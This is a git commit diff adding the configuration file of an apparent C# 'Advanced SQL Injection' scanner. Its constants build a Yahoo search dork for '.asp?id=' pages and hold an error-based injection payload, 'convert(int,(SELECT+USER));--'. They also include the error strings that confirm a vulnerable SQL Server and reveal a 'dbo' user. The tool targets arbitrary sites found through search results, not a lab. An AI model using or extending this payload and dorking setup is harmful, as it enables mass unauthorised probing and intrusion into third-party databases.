f9af2ba8e716d6eef59d91e8c66ff0271fe8373e
iricartb <iricartb@gmail.com>
2017-06-27 17:18:25 +0200

    Advanced SQL Injection - Version 1.0

---
+++ ScannerAdvSQLInjection/Global.cs
@@ -0,0 +1,20 @@
+using System;
+using System.Collections.Generic;
+using System.Text;
+
+namespace ScannerAdvSQLInjection {
+    static class Global {
+        public const string GLOBAL_SERVER_SEARCH_ENGINE = "search.yahoo.com";
+        
+        public const string GLOBAL_PARAM_SEARCH_ENGINE_SEARCH = "search?p=";
+        public const string GLOBAL_PARAM_SEARCH_ENGINE_SEARCH_VALUE = "\".asp{1}?{2}=\"";
+        public const string GLOBAL_PARAM_SEARCH_ENGINE_SEARCH_DEFAULT_VALUE_1 = "id";
+
+        public const string GLOBAL_PARAM_SEARCH_ENGINE_SEED = "&b=";
+        public const string GLOBAL_PARAM_SEARCH_ENGINE_SEED_DEFAULT_VALUE = "1";
+
+        public const string GLOBAL_PARAM_SEARCH_ENGINE_VULN_VALUE = "convert(int,(SELECT+USER));--";
+        public const string GLOBAL_RESPONSE_SEARCH_ENGINE_VULN_SENTENCE = "converting the nvarchar value";
+        public const string GLOBAL_RESPONSE_SEARCH_ENGINE_VULN_DBO_USER = "'dbo'";
+    }
+}
